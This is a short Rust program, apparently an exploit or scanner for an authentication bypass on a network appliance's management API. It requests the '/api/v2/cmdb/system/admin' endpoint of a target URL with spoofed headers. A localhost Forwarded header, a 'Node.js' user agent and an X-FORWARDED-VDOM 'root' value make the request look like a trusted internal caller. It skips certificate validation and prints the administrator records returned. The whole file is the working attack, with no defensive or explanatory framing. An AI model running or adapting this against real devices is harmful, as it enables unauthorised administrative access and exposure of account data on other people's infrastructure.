use serde::{Serialize, Deserialize};
use std::env;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, HOST, ACCEPT_ENCODING, FORWARDED};

#[derive(Debug, Serialize, Deserialize)]
struct Dex {
    name: String,
    serial: String,
    http_status: u32
    //result: HashMap<String, String>
}


fn construct_headers() -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT, HeaderValue::from_static("Node.js"));
    headers.insert(ACCEPT_ENCODING, HeaderValue::from_static("accept-encoding"));
    headers.insert(HOST, HeaderValue::from_static("127.0.0.1:9980"));
    headers.insert(FORWARDED, HeaderValue::from_static("by='[127.0.0.1]:80';for='[127.0.0.1]:49490';proto=http;host="));
    headers.insert("X-FORWARDED-VDOM", HeaderValue::from_static("root"));
    headers
}

//fn main() -> Result<(), Box<dyn Error>> {
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>>{

    openssl_probe::init_ssl_cert_env_vars();
    let args: Vec<String> = env::args().collect();
    let query = &args[1];
    let str = format!("{}/api/v2/cmdb/system/admin", query);
    //let client = reqwest::blocking::Client::builder()
    let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()?;

    //let client = reqwest::blocking::Client::new();
    //let res = client.get(str)
    let res = client.get(str).headers(construct_headers()).send().await?;

    match res.status() {
    reqwest::StatusCode::BAD_REQUEST => println!(
        "content-length:{:?} server:{:?}",
        res.headers().get(reqwest::header::CONTENT_LENGTH),
        res.headers().get(reqwest::header::SERVER),
    ),
    status => println!("status: {}", status),
    }

    let response_json: Dex = match res.json().await 
    {
       Ok(r) => r,
       Err(e) => panic!("Could not introspect the token. Error was:\n {:?}", e),
    };
    println!("{:?}", response_json);

    /*
    let ip = res
        .json::<Dex>()
        .await?;
    if res.status() == 200 {
        println!("[+] Vulnerable");
        println!("{:#?}", res);
    }
    else {
        println!("[-] Not Vulnerable");
        println!("Bad Status: {:?}", res.status())
    }*/
    Ok(())
}
